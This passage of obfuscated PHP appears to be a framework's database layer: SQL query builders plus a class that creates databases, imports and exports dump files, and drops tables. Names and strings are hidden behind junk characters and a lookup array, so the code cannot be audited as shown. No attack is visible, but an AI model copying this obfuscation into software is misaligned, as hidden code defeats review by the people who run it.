$à÷··Üû =& $_SERVER[±³—úê]; return !empty($Çï¢¨é») ? $à÷··Üû[1112] . $Çï¢¨é» : $à÷··Üû[12]; } protected function parseHaving($ã€åÅµ€) { $è´ç¡úã =& $_SERVER[±³—úê]; return !empty($ã€åÅµ€) ? $è´ç¡úã[1113] . $ã€åÅµ€ : $è´ç¡úã[12]; } protected function parseComment($•È›¶è€) { $ìÒõ±¼¿ =& $_SERVER[±³—úê]; return !empty($•È›¶è€) ? $ìÒõ±¼¿[1114] . $•È›¶è€ . $ìÒõ±¼¿[1115] : $ìÒõ±¼¿[12]; } protected function parseDistinct($ŞŞ¸¯¦ã) { $‹®Ç£ªØ =& $_SERVER[±³—úê]; return !empty($ŞŞ¸¯¦ã) ? $‹®Ç£ªØ[1116] : $‹®Ç£ªØ[12]; } protected function parseUnion($é™™Ö…ò) { $Ï¡ä´Ã’ =& $_SERVER[±³—úê]; if (empty($é™™Ö…ò)) { return $Ï¡ä´Ã’[12]; } if (isset($é™™Ö…ò[$Ï¡ä´Ã’[434]])) { $Íˆíó‘š = $Ï¡ä´Ã’[1117]; unset($é™™Ö…ò[$Ï¡ä´Ã’[434]]); } else { $Íˆíó‘š = $Ï¡ä´Ã’[1118]; } foreach ($é™™Ö…ò as $°òµ„Êğ) { $º£ù‹Åû[] = $Íˆíó‘š . (is_array($°òµ„Êğ) ? $this->buildSelectSql($°òµ„Êğ) : $°òµ„Êğ); } return implode($Ï¡ä´Ã’[53], $º£ù‹Åû); } public function insert($Õ¶€ŒŒŸ, $ëøÊİÓ = array(), $µ›Ë×ıü = false) { $Ş“«ë… =& $_SERVER[±³—úê]; $¢‚Ò÷“ = $°ëÒÙÊ = array(); $this->model = $ëøÊİÓ[$Ş“«ë…[369]]; foreach ($Õ¶€ŒŒŸ as $ç›–¾„Ş => $ª¼²¸îô) { if (is_array($ª¼²¸îô) && $Ş“«ë…[383] == $ª¼²¸îô[0]) { $°ëÒÙÊ[] = $this->parseKey($ç›–¾„Ş); $¢‚Ò÷“[] = $ª¼²¸îô[1]; } elseif (is_scalar($ª¼²¸îô) || is_null($ª¼²¸îô)) { $°ëÒÙÊ[] = $this->parseKey($ç›–¾„Ş); $¢‚Ò÷“[] = $this->parseValue($ª¼²¸îô); } } $¥ÏÆô– = ($µ›Ë×ıü ? $Ş“«ë…[986] : $Ş“«ë…[987]) . $Ş“«ë…[988] . $this->parseTable($ëøÊİÓ[$Ş“«ë…[367]]) . $Ş“«ë…[982] . implode($Ş“«ë…[50], $°ëÒÙÊ) . $Ş“«ë…[983] . implode($Ş“«ë…[50], $¢‚Ò÷“) . $Ş“«ë…[984]; $¥ÏÆô– .= $this->parseLock(isset($ëøÊİÓ[$Ş“«ë…[924]]) ? $ëøÊİÓ[$Ş“«ë…[924]] : !1); $¥ÏÆô– .= $this->parseComment(!empty($ëøÊİÓ[$Ş“«ë…[440]]) ? $ëøÊİÓ[$Ş“«ë…[440]] : $Ş“«ë…[12]); return $this->execute($¥ÏÆô–, $this->parseBind(!empty($ëøÊİÓ[$Ş“«ë…[371]]) ? $ëøÊİÓ[$Ş“«ë…[371]] : array())); } public function selectInsert($öÖôĞ¯, $¨‰Š­¸‡, $æ•¨Æ±¨ = array()) { $ÖôŸ‚šÔ =& $_SERVER[±³—úê]; $this->model = $æ•¨Æ±¨[$ÖôŸ‚šÔ[369]]; if (is_string($öÖôĞ¯)) { $öÖôĞ¯ = explode($ÖôŸ‚šÔ[50], $öÖôĞ¯); } array_walk($öÖôĞ¯, array($this, $ÖôŸ‚šÔ[985])); $øâš±³ = $ÖôŸ‚šÔ[1119] . $this->parseTable($¨‰Š­¸‡) . $ÖôŸ‚šÔ[982] . implode($ÖôŸ‚šÔ[50], $öÖôĞ¯) . $ÖôŸ‚šÔ[1097]; $øâš±³ .= $this->buildSelectSql($æ•¨Æ±¨); return $this->execute($øâš±³, $this->parseBind(!empty($æ•¨Æ±¨[$ÖôŸ‚šÔ[371]]) ? $æ•¨Æ±¨[$ÖôŸ‚šÔ[371]] : array())); } public function update($‡’ïê¯Å, $¤­³¹æ×) { $ÊŸ§ÂÄµ =& $_SERVER[±³—úê]; $this->model = $¤­³¹æ×[$ÊŸ§ÂÄµ[369]]; $µğ¼ĞÉ´ = $ÊŸ§ÂÄµ[1120] . $this->parseTable($¤­³¹æ×[$ÊŸ§ÂÄµ[367]]) . $this->parseSet($‡’ïê¯Å) . $this->parseWhere(!empty($¤­³¹æ×[$ÊŸ§ÂÄµ[363]]) ? $¤­³¹æ×[$ÊŸ§ÂÄµ[363]] : $ÊŸ§ÂÄµ[12]) . $this->parseOrder(!empty($¤­³¹æ×[$ÊŸ§ÂÄµ[452]]) ? $¤­³¹æ×[$ÊŸ§ÂÄµ[452]] : $ÊŸ§ÂÄµ[12]) . $this->parseLimit(!empty($¤­³¹æ×[$ÊŸ§ÂÄµ[378]]) ? $¤­³¹æ×[$ÊŸ§ÂÄµ[378]] : $ÊŸ§ÂÄµ[12]) . $this->parseLock(isset($¤­³¹æ×[$ÊŸ§ÂÄµ[924]]) ? $¤­³¹æ×[$ÊŸ§ÂÄµ[924]] : !1) . $this->parseComment(!empty($¤­³¹æ×[$ÊŸ§ÂÄµ[440]]) ? $¤­³¹æ×[$ÊŸ§ÂÄµ[440]] : $ÊŸ§ÂÄµ[12]); return $this->execute($µğ¼ĞÉ´, $this->parseBind(!empty($¤­³¹æ×[$ÊŸ§ÂÄµ[371]]) ? $¤­³¹æ×[$ÊŸ§ÂÄµ[371]] : array())); } public function delete($³ìüøí¤ = array()) { $³’°ÂşÅ =& $_SERVER[±³—úê]; $this->model = $³ìüøí¤[$³’°ÂşÅ[369]]; $¾µŠ£ÇÑ = $³’°ÂşÅ[1121] . $this->parseTable($³ìüøí¤[$³’°ÂşÅ[367]]) . $this->parseWhere(!empty($³ìüøí¤[$³’°ÂşÅ[363]]) ? $³ìüøí¤[$³’°ÂşÅ[363]] : $³’°ÂşÅ[12]) . $this->parseOrder(!empty($³ìüøí¤[$³’°ÂşÅ[452]]) ? $³ìüøí¤[$³’°ÂşÅ[452]] : $³’°ÂşÅ[12]) . $this->parseLimit(!empty($³ìüøí¤[$³’°ÂşÅ[378]]) ? $³ìüøí¤[$³’°ÂşÅ[378]] : $³’°ÂşÅ[12]) . $this->parseLock(isset($³ìüøí¤[$³’°ÂşÅ[924]]) ? $³ìüøí¤[$³’°ÂşÅ[924]] : !1) . $this->parseComment(!empty($³ìüøí¤[$³’°ÂşÅ[440]]) ? $³ìüøí¤[$³’°ÂşÅ[440]] : $³’°ÂşÅ[12]); return $this->execute($¾µŠ£ÇÑ, $this->parseBind(!empty($³ìüøí¤[$³’°ÂşÅ[371]]) ? $³ìüøí¤[$³’°ÂşÅ[371]] : array())); } public function select($Şî¦“à = array()) { $è¦Û”¾½ =& $_SERVER[±³—úê]; $this->model = $Şî¦“à[$è¦Û”¾½[369]]; $°³óÑ¤Ò = $this->buildSelectSql($Şî¦“à); $šÒ²¬Š” = isset($Şî¦“à[$è¦Û”¾½[435]]) ? $Şî¦“à[$è¦Û”¾½[435]] : !1; if ($šÒ²¬Š”) { $ÊŸ¤ƒ‚š = is_string($šÒ²¬Š”[$è¦Û”¾½[97]]) ? $šÒ²¬Š”[$è¦Û”¾½[97]] : $è¦Û”¾½[1122] . md5($°³óÑ¤Ò); $Ù¥°–Ğå = think_cache($ÊŸ¤ƒ‚š, $è¦Û”¾½[12], $šÒ²¬Š”); if (!1 !== $Ù¥°–Ğå) { return $Ù¥°–Ğå; } } $Ì¿åƒÏı = $this->query($°³óÑ¤Ò, $this->parseBind(!empty($Şî¦“à[$è¦Û”¾½[371]]) ? $Şî¦“à[$è¦Û”¾½[371]] : array())); if ($šÒ²¬Š” && !1 !== $Ì¿åƒÏı) { think_cache($ÊŸ¤ƒ‚š, $Ì¿åƒÏı, $šÒ²¬Š”); } return $Ì¿åƒÏı; } public function buildSelectSql($¾´µÄ¤ = array()) { $‡èª²”‡ =& $_SERVER[±³—úê]; if (isset($¾´µÄ¤[$‡èª²”‡[439]])) { if (strpos($¾´µÄ¤[$‡èª²”‡[439]], $‡èª²”‡[50])) { list($±´¦Ø½î, $Ö¾±–˜²) = explode($‡èª²”‡[50], $¾´µÄ¤[$‡èª²”‡[439]]); } else { $±´¦Ø½î = $¾´µÄ¤[$‡èª²”‡[439]]; } $±´¦Ø½î = $±´¦Ø½î ? $±´¦Ø½î : 1; $Ö¾±–˜² = isset($Ö¾±–˜²) ? $Ö¾±–˜² : (is_numeric($¾´µÄ¤[$‡èª²”‡[378]]) ? $¾´µÄ¤[$‡èª²”‡[378]] : 20); $¿é’£Û¼ = $Ö¾±–˜² * ((int) $±´¦Ø½î - 1); $¾´µÄ¤[$‡èª²”‡[378]] = $¿é’£Û¼ . $‡èª²”‡[50] . $Ö¾±–˜²; } if (think_config($‡èª²”‡[1123])) { $˜¸ÏÌÅ = $‡èª²”‡[1124] . md5(serialize($¾´µÄ¤)); $øïàƒ³ = think_cache($˜¸ÏÌÅ); if ($øïàƒ³) { return $øïàƒ³; } } $Ğì€Æ¬¨ = $this->parseSql($this->selectSql, $¾´µÄ¤); $Ğì€Æ¬¨ .= $this->parseLock(isset($¾´µÄ¤[$‡èª²”‡[924]]) ? $¾´µÄ¤[$‡èª²”‡[924]] : !1); if (isset($˜¸ÏÌÅ)) { think_cache($˜¸ÏÌÅ, $Ğì€Æ¬¨); } return $Ğì€Æ¬¨; } public function parseSql($×ş”¿Ò, $½³®™õ = array()) { $–”•¨È =& $_SERVER[±³—úê]; $×ş”¿Ò = str_replace(array($–”•¨È[1125], $–”•¨È[1126], $–”•¨È[1127], $–”•¨È[1128], $–”•¨È[1129], $–”•¨È[1130], $–”•¨È[1131], $–”•¨È[1132], $–”•¨È[1133], $–”•¨È[1134], $–”•¨È[1135]), array($this->parseTable("{$½³®™õ[$–”•¨È[367]]}"), $this->parseDistinct(isset($½³®™õ[$–”•¨È[1136]]) ? $½³®™õ[$–”•¨È[1136]] : !1), $this->parseField(!empty($½³®™õ[$–”•¨È[361]]) ? $½³®™õ[$–”•¨È[361]] : $–”•¨È[232]), $this->parseJoin(!empty($½³®™õ[$–”•¨È[370]]) ? $½³®™õ[$–”•¨È[370]] : $–”•¨È[12]), $this->parseWhere(!empty($½³®™õ[$–”•¨È[363]]) ? $½³®™õ[$–”•¨È[363]] : $–”•¨È[12]), $this->parseGroup(!empty($½³®™õ[$–”•¨È[589]]) ? $½³®™õ[$–”•¨È[589]] : $–”•¨È[12]), $this->parseHaving(!empty($½³®™õ[$–”•¨È[1137]]) ? $½³®™õ[$–”•¨È[1137]] : $–”•¨È[12]), $this->parseOrder(!empty($½³®™õ[$–”•¨È[452]]) ? $½³®™õ[$–”•¨È[452]] : $–”•¨È[12]), $this->parseLimit(!empty($½³®™õ[$–”•¨È[378]]) ? $½³®™õ[$–”•¨È[378]] : $–”•¨È[12]), $this->parseUnion(!empty($½³®™õ[$–”•¨È[433]]) ? $½³®™õ[$–”•¨È[433]] : $–”•¨È[12]), $this->parseComment(!empty($½³®™õ[$–”•¨È[440]]) ? $½³®™õ[$–”•¨È[440]] : $–”•¨È[12])), $×ş”¿Ò); return $×ş”¿Ò; } public function getLastSql($¬Ñ•ö¹ = '') { return $¬Ñ•ö¹ ? $this->modelSql[$¬Ñ•ö¹] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($”¯Ïù§ä) { return addslashes($”¯Ïù§ä); } public function setModel($õàâôÏı) { $this->model = $õàâôÏı; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ÎÄ‚óëä = array()) { $ÄáâÚ =& $_SERVER[±³—úê]; if (empty($ÎÄ‚óëä)) { $ÎÄ‚óëä = $GLOBALS[$ÄáâÚ[6]][$ÄáâÚ[21]]; } $this->database = $ÎÄ‚óëä; } public function model($âÎ•¸– = '') { return new ModelBase($âÎ•¸–, $_SERVER[±³—úê][12], $this->database); } public function db($ê¸ä®­ó = false) { $´™äÆ«ı =& $_SERVER[±³—úê]; $¨…™±ğ = array_change_key_case($this->database); if ($this->dbType() == $´™äÆ«ı[13] || !$ê¸ä®­ó) { return $this->model()->db(); } $ÚğŠ¼é® = $¨…™±ğ[$´™äÆ«ı[1051]]; $¨…™±ğ[$´™äÆ«ı[1051]] = $´™äÆ«ı[12]; if ($¨…™±ğ[$´™äÆ«ı[1046]] == $´™äÆ«ı[1043]) { $×––×Ãû = $¨…™±ğ[$´™äÆ«ı[1052]]; $¨…™±ğ[$´™äÆ«ı[1052]] = substr($×––×Ãû, 0, strrpos($×––×Ãû, $´™äÆ«ı[1138])); } $this->database = $¨…™±ğ; $Ãî÷Æá¹ = $this->model()->db(); try { $Ê€„¦ÈÙ = $Ãî÷Æá¹->execute("\163\x68\x6f\x77\40\x64\x61\164\141\x62\141\x73\x65\x73\40\154\x69\153\x65\x20\x27{$ÚğŠ¼é®}\x27"); } catch (Exception $ï™¦¸ô) { } if (!$Ê€„¦ÈÙ) { $Ãî÷Æá¹->execute("\x63\162\145\x61\164\145\40\144\141\164\141\x62\x61\163\145\x20\x60{$ÚğŠ¼é®}\140"); } $¨…™±ğ[$´™äÆ«ı[1051]] = $ÚğŠ¼é®; if ($¨…™±ğ[$´™äÆ«ı[1046]] == $´™äÆ«ı[1043]) { $¨…™±ğ[$´™äÆ«ı[1052]] .= $´™äÆ«ı[1138] . $ÚğŠ¼é®; } $this->database = $¨…™±ğ; $Ãî÷Æá¹->execute("\165\x73\x65\x20\x60{$ÚğŠ¼é®}\x60"); return $Ãî÷Æá¹; } public function createTable($ƒ¦½Ğ±á, &$˜×©ş¨ß) { $’˜Å¸ø˜ =& $_SERVER[±³—úê]; if (!IO::exist($ƒ¦½Ğ±á)) { ActionCall($’˜Å¸ø˜[1139], !0, 0); show_json(LNG($’˜Å¸ø˜[1140]), !1); } $†«¯©ò = $this->model()->db(); $¹¨¤««£ = sqlSplit(IO::getContent($ƒ¦½Ğ±á)); foreach ($¹¨¤««£ as $¼Áéõ£Ú) { $ûìÄñ‹ë = stripos($¼Áéõ£Ú, $’˜Å¸ø˜[1141]) === 0; if ($ûìÄñ‹ë) { $˜×©ş¨ß->task[$’˜Å¸ø˜[1142]] += 1; } $†«¯©ò->execute($¼Áéõ£Ú); if ($ûìÄñ‹ë) { preg_match($’˜Å¸ø˜[1143], $¼Áéõ£Ú, $Âøòß”); $˜×©ş¨ß->task[$’˜Å¸ø˜[1144]] = $Âøòß”[1]; $˜×©ş¨ß->update(1); } } } public function insertTable($Ì™šìŒ›, &$ŸÈ‡€£Ñ) { $ˆĞåÌ´ =& $_SERVER[±³—úê]; $›ûİÙÑƒ = $this->model()->db(); $Ï³ÎÈ˜à = $„”Œé¥÷ ? array($„”Œé¥÷) : $›ûİÙÑƒ->getTables(); foreach ($Ì™šìŒ› as $îöËá§µ) { $„”Œé¥÷ = basename($îöËá§µ, $ˆĞåÌ´[869]); if (!in_array($„”Œé¥÷, $Ï³ÎÈ˜à)) { continue; } $ŸÈ‡€£Ñ->task[$ˆĞåÌ´[1144]] = $„”Œé¥÷; if (get_filesize($îöËá§µ) == 0) { continue; } $Á–Öüâ = $this->sqlToDb($îöËá§µ, $ŸÈ‡€£Ñ); if (!$Á–Öüâ) { ActionCall($ˆĞåÌ´[1139], !0, 0); show_json(LNG($ˆĞåÌ´[1145]) . "\x5b{$„”Œé¥÷}\135", !1); } } } public function sqlFromDb($¼èà÷ÙÀ, $‚Á¯î­ì, &$…§ô°œ×, $ò–®ğ°‹ = '') { if ($…§ô°œ×) { $…§ô°œ×->task[$_SERVER[±³—úê][1144]] = $¼èà÷ÙÀ; } $§ä€ºœÜ = $this->model($¼èà÷ÙÀ); $ã‡–ËÅ— = 0; $–®¤±«ñ = 0; $ÍØã×‚í = 10000; $µ‡ÊĞûŠ = fopen($‚Á¯î­ì, $_SERVER[±³—úê][1146]); $ÖÁÍÖ€µ = $§ä€ºœÜ->getPk(); $¬²åØ§ = $§ä€ºœÜ->getDbFields(); $˜û³Î€Ğ = $_SERVER[±³—úê][12]; if ($GLOBALS[$_SERVER[±³—úê][868]] && in_array($¼èà÷ÙÀ, array($_SERVER[±³—úê][1147], $_SERVER[±³—úê][1148]))) { $˜û³Î€Ğ = $¼èà÷ÙÀ; } do { $’üİÍï· = array($ÖÁÍÖ€µ => array($_SERVER[±³—úê][1093], $–®¤±«ñ)); $¬À‹¯Ç = $§ä€ºœÜ->where($’üİÍï·)->field($¬²åØ§)->order($ÖÁÍÖ€µ . $_SERVER[±³—úê][1149])->limit($ÍØã×‚í)->select(); $¬À‹¯Ç = !empty($¬À‹¯Ç) ? $¬À‹¯Ç : array(); if (!($³äÓŞÇÀ = count($¬À‹¯Ç))) { break; } $õ¥’¼û’ = end($¬À‹¯Ç); $–®¤±«ñ = $õ¥’¼û’[$ÖÁÍÖ€µ]; $úœ¦Ö = array(); foreach ($¬À‹¯Ç as $£±‡Õ) { if ($˜û³Î€Ğ) { if ($¼èà÷ÙÀ == $_SERVER[±³—úê][1147]) { if ($£±‡Õ[$_SERVER[±³—úê][33]] == $_SERVER[±³—úê][1150]) { $øì¿¬€É = json_decode($£±‡Õ[$_SERVER[±³—úê][461]], !0); if ($øì¿¬€É[$_SERVER[±³—úê][32]] == $GLOBALS[$_SERVER[±³—úê][868]] && $øì¿¬€É[$_SERVER[±³—úê][830]] != 1) { continue; } } } else { if ($£±‡Õ[$_SERVER[±³—úê][33]] == $_SERVER[±³—úê][1151] && $£±‡Õ[$_SERVER[±³—úê][97]] == $_SERVER[±³—úê][863]) { continue; } } } if ($ò–®ğ°‹) { $£±‡Õ[$_SERVER[±³—úê][87]] = "\x7b\151\157\x3a{$ò–®ğ°‹}\175" . substr($£±‡Õ[$_SERVER[±³—úê][87]], strlen("\x7b\x69\157\72{$£±‡Õ[$_SERVER[±³—úê][898]]}\x7d")); $£±‡Õ[$_SERVER[±³—úê][898]] = $ò–®ğ°‹; } $úœ¦Ö[] = $_SERVER[±³—úê][1152] . $this->sqlEncode($£±‡Õ) . $_SERVER[±³—úê][1153]; } $¡³š¾Ë = "\111\116\123\x45\x52\x54\40\111\116\124\117\40\x60{$¼èà÷ÙÀ}\x60\x20\x28\140" . implode($_SERVER[±³—úê][1154], $¬²åØ§) . $_SERVER[±³—úê][1155]; fwrite($µ‡ÊĞûŠ, $¡³š¾Ë . implode($_SERVER[±³—úê][1156], $úœ¦Ö) . $_SERVER[±³—úê][74] . PHP_EOL); $ã‡–ËÅ— += $³äÓŞÇÀ; if ($…§ô°œ×) { $…§ô°œ×->update($³äÓŞÇÀ); } } while ($ÍØã×‚í == $³äÓŞÇÀ); fclose($µ‡ÊĞûŠ); return $ã‡–ËÅ—; } public function sqlToDb($òïƒÊäø, &$îìŒÕô‹) { $‰«¼Óğú =& $_SERVER[±³—úê]; $®Ôı±Ùò = $this->model()->db(); $åæŸ¨Á® = @fopen($òïƒÊäø, $‰«¼Óğú[1157]); if (!$åæŸ¨Á®) { return !1; } $‘ó¨¯á• = 0; $¯êÇ¸…³ = $‰«¼Óğú[12]; $²ŞêåŒÛ = array(); $€ü®æÀÌ = $this->dbType(); $ÕåşîÚš = $€ü®æÀÌ == $‰«¼Óğú[13] ? 500 : 2000; $º‘£¨üÜ = basename($òïƒÊäø, $‰«¼Óğú[869]); $ã–¿æ™® = 0; $°Ñ„„¼ø = 4194304; while (!feof($åæŸ¨Á®)) { $³÷‰¦ Ü = trim(fgets($åæŸ¨Á®)); if (!$³÷‰¦ Ü) { continue; } $½–ÑÉå“ = $this->sqlDecode($³÷‰¦ Ü, $€ü®æÀÌ, $º‘£¨üÜ); if (stripos($½–ÑÉå“, $‰«¼Óğú[441]) === 0) { if (!$¯êÇ¸…³) { $¯êÇ¸…³ = $½–ÑÉå“ . $‰«¼Óğú[53]; } continue; } if ($îìŒÕô‹) { $îìŒÕô‹->task[$‰«¼Óğú[1142]] += 1; } $‘ó¨¯á•++; $²ŞêåŒÛ[] = rtrim(rtrim(trim($½–ÑÉå“), $‰«¼Óğú[50]), $‰«¼Óğú[74]); $ùôòƒúŠ = null; $›²©İ‰© = strlen($½–ÑÉå“); $ã–¿æ™® += $›²©İ‰©; $ù¹–ıÛÆ = strlen($¯êÇ¸…³) + $ã–¿æ™® + (count($²ŞêåŒÛ) - 1); if ($ù¹–ıÛÆ >= $°Ñ„„¼ø) { $ùôòƒúŠ = array_pop($²ŞêåŒÛ); if ($‘ó¨¯á• > 1) { $‘ó¨¯á•--; } } if ($‘ó¨¯á• >= $ÕåşîÚš || $ùôòƒúŠ) { $½–ÑÉå“ = $¯êÇ¸…³ . implode($‰«¼Óğú[50], $²ŞêåŒÛ); if (!$®Ôı±Ùò->execute($½–ÑÉå“)) { return !1; } if ($îìŒÕô‹) { $îìŒÕô‹->update($‘ó¨¯á•); } $²ŞêåŒÛ = array(); $‘ó¨¯á• = 0; $ã–¿æ™® = 0; if ($ùôòƒúŠ) { $²ŞêåŒÛ = array($ùôòƒúŠ); $‘ó¨¯á• = 1; $ã–¿æ™® = $›²©İ‰©; } } } fclose($åæŸ¨Á®); if (!empty($²ŞêåŒÛ)) { $½–ÑÉå“ = $¯êÇ¸…³ . implode($‰«¼Óğú[50], $²ŞêåŒÛ); if (!$®Ôı±Ùò->execute($½–ÑÉå“)) { return !1; } if ($îìŒÕô‹) { $îìŒÕô‹->update($‘ó¨¯á•); } } return !0; } public function dropTable($¹üßåğá = null) { $ŞŸØÚ = $this->model()->db(); $õß•Ş = $¹üßåğá ? array($¹üßåğá) : $ŞŸØÚ->getTables(); if (!$õß•Ş) { return; } foreach ($õß•Ş as $¹üßåğá) { if ($¹üßåğá) { $¹üßåğá = strtolower($¹üßåğá); } else { continue; } $ŞŸØÚ->execute("\x64\x72\x6f\160\x20\164\141\142\x6c\x65\x20\x69\146\40\x65\170\151\x73\164\163\x20\140{$¹üßåğá}\x60"); } } private function sqlEncode($Ã­†•Œó) { $Õ‘œì‰ˆ =& $_SERVER[±³—úê]; $©óƒ¢Ó² = array(); foreach ($Ã­†•Œó as $é†¼Ô) { if (is_array($é†¼Ô)) { $é†¼Ô = json_encode_force($é†¼Ô); } $é†¼Ô = addslashes($é†¼Ô); $é†¼Ô = str_replace(array($Õ‘œì‰ˆ[1158], $Õ‘œì‰ˆ[221], $Õ‘œì‰ˆ[428]), array($Õ‘œì‰ˆ[1159], $Õ‘œì‰ˆ[1160], $Õ‘œì‰ˆ[1161]), $é†¼Ô); $©óƒ¢Ó²[] = $é†¼Ô; } return $Õ‘œì‰ˆ[58] . implode($Õ‘œì‰ˆ[1162], $©óƒ¢Ó²) . $Õ‘œì‰ˆ[58]; } private function sqlDecode($èà®—ğ, $Í‚ÂŒ¬€, $ß³âŠ¦ = '') { $‰†ŞöÆë =& $_SERVER[±³—úê]; $èà®—ğ = str_replace(array($‰†ŞöÆë[1159], $‰†ŞöÆë[1160], $‰†ŞöÆë[1161]), array($‰†ŞöÆë[1158], $‰†ŞöÆë[221], $‰†ŞöÆë[428]), $èà®—ğ); if ($Í‚ÂŒ¬€ == $‰†ŞöÆë[13]) { $èà®—ğ = str_ireplace($‰†ŞöÆë[1163], $‰†ŞöÆë[59], $èà®—ğ); $èà®—ğ = stripslashes($èà®—ğ); } return preg_replace($‰†ŞöÆë[1164], $‰†ŞöÆë[12], $èà®—ğ); if ($Í‚ÂŒ¬€ == $‰†ŞöÆë[13]) { return $ß³âŠ¦ != $‰†ŞöÆë[862] ? stripslashes($èà®—ğ) : $èà®—ğ; } if ($ß³âŠ¦ == $‰†ŞöÆë[862]) { $èà®—ğ = str_replace($‰†ŞöÆë[1165], $‰†ŞöÆë[121], stripslashes($èà®—ğ)); } return $èà®—ğ; } public function getSqlFile($¦Éƒµš€ = '') { $Ğğİ§ Æ =& $_SERVER[±³—úê]; $³ú’Š£— = $this->dbType(!0); $Ã³İ¼óû = CONTROLLER_DIR . "\151\156\x73\x74\141\154\x6c\57\144\x61\164\141\x2f{$³ú’Š£—}\56\163\x71\x6c"; $„İ½óˆ÷ = file_get_contents($Ã³İ¼óû); $ÌÜï‡üŸ = $Ğğİ§ Æ[1166] . ($³ú’Š£— == $Ğğİ§ Æ[885] ? $Ğğİ§ Æ[1167] : $Ğğİ§ Æ[1168]) . $Ğğİ§ Æ[1169]; preg_match_all($ÌÜï‡üŸ, $„İ½óˆ÷, $âªÔéš); $•‡óğ×Ò = $âªÔéš[1]; $¡óÓ”» = $this->model()->db(); $™³‘‘‚‰ = $¡óÓ”»->getTables(); $²¢–úˆ¶ = TEMP_FILES . $Ğğİ§ Æ[1170] . date($Ğğİ§ Æ[271]) . $Ğğİ§ Æ[8]; del_dir($²¢–úˆ¶); mk_dir($²¢–úˆ¶); $„Ö¿µÉ‡ = $²¢–úˆ¶ . $Ğğİ§ Æ[1171]; $üçç¸ÔÆ = $²¢–úˆ¶ . $Ğğİ§ Æ[1172]; $ÚÆ—»°Ù = $³ú’Š£— == $Ğğİ§ Æ[13] ? $Ğğİ§ Æ[885] : $Ğğİ§ Æ[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\141\x6c\x6c\57\x64\x61\164\141\x2f{$ÚÆ—»°Ù}\56\163\x71\x6c", $²¢–úˆ¶); @touch($²¢–úˆ¶ . $³ú’Š£— . $Ğğİ§ Æ[869]); $ ÚİÂä = fopen($„Ö¿µÉ‡, $Ğğİ§ Æ[1146]); $Ã›ŞÖö¦ = fopen($üçç¸ÔÆ, $Ğğİ§ Æ[1146]); if ($³ú’Š£— == $Ğğİ§ Æ[13]) { $™³‘‘‚‰ = array_diff($™³‘‘‚‰, array($Ğğİ§ Æ[860], $Ğğİ§ Æ[861])); $Ÿ´³Éœİ = array($Ğğİ§ Æ[1173], $Ğğİ§ Æ[1174], $Ğğİ§ Æ[1175]); fwrite($Ã›ŞÖö¦, implode(PHP_EOL, $Ÿ´³Éœİ) . PHP_EOL . PHP_EOL); foreach ($™³‘‘‚‰ as $öæ¯Ş¼ğ) { $ù€Ú€Ò˜ = $this->sqlFromSqlite($öæ¯Ş¼ğ); if (!$ù€Ú€Ò˜[$Ğğİ§ Æ[13]]) { continue; } fwrite($Ã›ŞÖö¦, $ù€Ú€Ò˜[$Ğğİ§ Æ[13]] . PHP_EOL . PHP_EOL); if (!in_array($öæ¯Ş¼ğ, $•‡óğ×Ò)) { fwrite($ ÚİÂä, $ù€Ú€Ò˜[$Ğğİ§ Æ[885]] . PHP_EOL . PHP_EOL); } } } else { foreach ($™³‘‘‚‰ as $öæ¯Ş¼ğ) { $ù€Ú€Ò˜ = $this->sqlFromMysql($öæ¯Ş¼ğ); if (!$ù€Ú€Ò˜[$Ğğİ§ Æ[885]]) { continue; } fwrite($ ÚİÂä, $ù€Ú€Ò˜[$Ğğİ§ Æ[885]] . PHP_EOL . PHP_EOL); if (!in_array($öæ¯Ş¼ğ, $•‡óğ×Ò)) { fwrite($Ã›ŞÖö¦, $ù€Ú€Ò˜[$Ğğİ§ Æ[13]] . PHP_EOL . PHP_EOL); } } } fclose($ ÚİÂä); fclose($Ã›ŞÖö¦); $„İ½óˆ÷ = array($Ğğİ§ Æ[885] => $„Ö¿µÉ‡, $Ğğİ§ Æ[13] => $üçç¸ÔÆ); return $¦Éƒµš€ ? $„İ½óˆ÷[$¦Éƒµš€] : $„İ½óˆ÷; } public function dbType($èÍëù“ = false) { $ÁìŞşÓ =& $_SERVER[±³—úê]; $êªĞøƒ  = $èÍëù“ ? $GLOBALS[$ÁìŞşÓ[6]][$ÁìŞşÓ[21]] : $this->database; $êªĞøƒ  = array_change_key_case($êªĞøƒ ); $”ŸèÛÙª = $êªĞøƒ [$ÁìŞşÓ[1046]]; if ($”ŸèÛÙª == $ÁìŞşÓ[1043]) { $ØËëÎöö = explode($ÁìŞşÓ[4], $êªĞøƒ [$ÁìŞşÓ[1052]]); $”ŸèÛÙª = $ØËëÎöö[0]; } $¸ìıØÖœ = array($ÁìŞşÓ[1176] => $ÁìŞşÓ[13], $ÁìŞşÓ[991] => $ÁìŞşÓ[885]); if (isset($¸ìıØÖœ[$”ŸèÛÙª])) { $”ŸèÛÙª = $¸ìıØÖœ[$”ŸèÛÙª]; } return $”ŸèÛÙª; } public function sqlFromMysql($å´´¹şÏ, $øåáì±ˆ = '') { $šğ“…É =& $_SERVER[±³—úê]; $Œ·ÕÖ­¯ = $this->model()->db(); $ó÷„“ŒÈ = $Œ·ÕÖ­¯->query($šğ“…É[1177] . $å´´¹şÏ . $šğ“…É[472]); if (!$ó÷„“ŒÈ || !$ó÷„“ŒÈ[0]) { return !1; } $ü÷™€ = _get($ó÷„“ŒÈ[0], $šğ“…É[1178], $šğ“…É[12]); if (!$ü÷™€) { return !1; } $à¿±³Ğı = "\104\122\x4f\x50\x20\124\101\102\114\105\x20\x49\106\x20\105\x58\111\x53\124\123\40\140{$å´´¹şÏ}\140\x3b" . PHP_EOL . $ü÷™€ . $šğ“…É[74]; if ($øåáì±ˆ && $øåáì±ˆ == $šğ“…É[885]) { return $à¿±³Ğı; } $…‚·•ã¡ = array_change_key_case($GLOBALS[$šğ“…É[6]][$šğ“…É[21]]); $ÆÓ·×ô = $…‚·•ã¡[$šğ“…É[1051]]; $›œª— = $šğ“…É[1179] . $ÆÓ·×ô . $šğ“…É[1180] . $å´´¹şÏ . $šğ“…É[58]; $¨Èõ–İÁ = $šğ“…É[1181] . $å´´¹şÏ . $šğ“…É[979]; $à†¦Šã = $Œ·ÕÖ­¯->query($›œª—); if (empty($à†¦Šã)) { $‚şáÚ…½ = array($šğ“…É[885] => $šğ“…É[12], $šğ“…É[13] => 